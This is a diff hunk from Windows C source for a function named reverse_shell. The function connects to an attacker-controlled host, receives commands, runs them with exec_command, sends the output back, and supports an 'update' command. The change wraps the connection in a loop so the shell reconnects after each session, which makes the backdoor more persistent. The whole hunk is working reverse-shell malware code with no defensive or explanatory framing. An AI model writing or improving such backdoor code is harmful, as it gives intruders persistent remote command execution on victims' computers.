@@ -367,34 +367,38 @@ DWORD WINAPI    reverse_shell(LPVOID arg)
     if (!init_winsock())
         return 1;
 
-    sock = connect_to_attacker();
-    if (sock == INVALID_SOCKET)
-    {
-        WSACleanup();
-        return 1;
-    }
-
     while (1)
     {
-        len = recv_line(sock, cmd, MAX_CMD);
-        if (len < 0)
-            break;
-
-        if (_stricmp(cmd, "exit") == 0)
-            break;
-
-        if (_stricmp(cmd, "update") == 0)
+        sock = connect_to_attacker();
+        if (sock == INVALID_SOCKET)
         {
-            handle_update(sock);
-            break;
+            WSACleanup();
+            return 1;
         }
 
-        len = exec_command(cmd, output, MAX_OUTPUT);
-        send_all(sock, output, len);
-        send_all(sock, "\n> ", 3);
+        while (1)
+        {
+            len = recv_line(sock, cmd, MAX_CMD);
+            if (len < 0)
+                break;
+
+            if (_stricmp(cmd, "exit") == 0)
+                break;
+
+            if (_stricmp(cmd, "update") == 0)
+            {
+                handle_update(sock);
+                break;
+            }
+
+            len = exec_command(cmd, output, MAX_OUTPUT);
+            send_all(sock, output, len);
+            send_all(sock, "\n> ", 3);
+        }
+
+        closesocket(sock);
     }
 
-    closesocket(sock);
     WSACleanup();
     return 0;
 }
